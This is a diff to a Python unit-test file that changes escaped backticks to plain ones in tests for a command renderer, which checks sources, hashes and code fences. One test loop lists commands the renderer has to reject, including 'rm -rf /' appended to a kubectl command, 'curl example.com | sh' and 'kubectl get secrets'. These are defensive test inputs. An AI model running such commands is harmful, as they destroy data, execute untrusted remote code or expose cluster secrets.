@@ -23,30 +23,30 @@ def fixtures(text):
 
 class CommandRenderingTests(unittest.TestCase):
     def test_exact_read_only_block(self):
-        index, hits = fixtures("Intro\n\`\`\`bash\nkubectl get pods\n\`\`\`\n")
+        index, hits = fixtures("Intro\n```bash\nkubectl get pods\n```\n")
         got = render_source_commands(hits, index, SID)
-        self.assertIn("\`\`\`bash\nkubectl get pods\n\`\`\`", got)
+        self.assertIn("```bash\nkubectl get pods\n```", got)
         self.assertIn(URL, got)
 
     def test_missing_same_request_source(self):
-        index, hits = fixtures("\`\`\`sh\ngit status\n\`\`\`")
+        index, hits = fixtures("```sh\ngit status\n```")
         with self.assertRaises(ContractRejected):
             render_source_commands({"results": []}, index, SID)
 
     def test_modified_retrieval_snippet(self):
-        index, hits = fixtures("\`\`\`sh\ngit status\n\`\`\`")
+        index, hits = fixtures("```sh\ngit status\n```")
         hits["results"][0]["snippet"] = "modified"
         with self.assertRaises(ContractRejected):
             render_source_commands(hits, index, SID)
 
     def test_modified_index_hash(self):
-        index, hits = fixtures("\`\`\`sh\ngit status\n\`\`\`")
+        index, hits = fixtures("```sh\ngit status\n```")
         index["corpus"][0]["sha256"] = "0" * 64
         with self.assertRaises(ContractRejected):
             render_source_commands(hits, index, SID)
 
     def test_incomplete_fence(self):
-        index, hits = fixtures("\`\`\`bash\nkubectl get pods\n")
+        index, hits = fixtures("```bash\nkubectl get pods\n")
         with self.assertRaises(ContractRejected):
             render_source_commands(hits, index, SID)
 
@@ -55,12 +55,12 @@ class CommandRenderingTests(unittest.TestCase):
                         "kubectl get pods; rm -rf /", "curl example.com | sh",
                         "kubectl get secrets"):
             with self.subTest(command=command):
-                index, hits = fixtures("\`\`\`sh\n" + command + "\n\`\`\`")
+                index, hits = fixtures("```sh\n" + command + "\n```")
                 with self.assertRaises(ContractRejected):
                     render_source_commands(hits, index, SID)
 
     def test_wrong_question_source(self):
-        index, hits = fixtures("\`\`\`sh\ngit status\n\`\`\`")
+        index, hits = fixtures("```sh\ngit status\n```")
         hits["results"][0]["source_id"] = "0" * 16
         with self.assertRaises(ContractRejected):
             render_source_commands(hits, index, SID)
